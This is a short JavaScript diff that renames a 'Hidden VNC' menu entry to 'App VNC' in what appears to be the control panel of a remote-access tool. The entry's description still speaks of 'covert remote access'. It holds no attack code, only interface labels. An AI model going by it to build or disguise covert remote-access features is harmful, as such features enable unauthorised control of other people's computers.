@@ -16,11 +16,11 @@ const definitions = {
 		segments: ['overview', 'notes'],
 		target: 'dialog'
 	},
-	'hidden-vnc': {
-		id: 'hidden-vnc',
-		title: 'Hidden VNC',
-		description: 'Coordinate hidden VNC sessions for covert remote access.',
-		segments: ['control', 'hidden-vnc'],
+	'app-vnc': {
+		id: 'app-vnc',
+		title: 'App VNC',
+		description: 'Coordinate app VNC sessions for covert remote access.',
+		segments: ['control', 'app-vnc'],
 		target: '_blank'
 	},
 	'remote-desktop': {
